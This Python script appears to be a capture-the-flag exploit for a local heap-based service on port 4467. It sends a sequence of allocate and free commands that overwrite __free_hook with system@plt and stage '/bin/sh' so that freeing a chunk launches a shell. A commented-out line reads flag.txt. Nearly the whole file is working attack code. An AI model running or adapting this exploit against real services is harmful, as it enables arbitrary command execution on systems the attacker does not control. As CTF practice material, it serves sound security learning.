import sys
import struct
import socket

address = 'localhost'

port = 4467

p = lambda x : (struct.pack('Q', x))

s = socket.create_connection((address, port))

__free_hook = 0x407068

system_plt = 0x401090


pr = b'aA12345678'

s.send(pr)

c = b'aF12345678'

s.send(c)

sec = b'dA'

s.send(sec)

d = b'dF'

s.send(d)

ter = b'dA'

s.send(ter)

qu = b'aB' + p(__free_hook - 16)

s.send(qu)

e = b'aG12345678'

s.send(e)

qi = b'aC' + b'/bin/sh\0'

s.send(qi)

sex = b'aD' + p(system_plt)

s.send(sex)

sept = b'dC'

s.send(sept)


#s.send(b'/bin/cat flag.txt\n')

s.send(b'/bin/echo juventus\n')

sys.stdout.buffer.write(s.recv(0x200))


s.close()
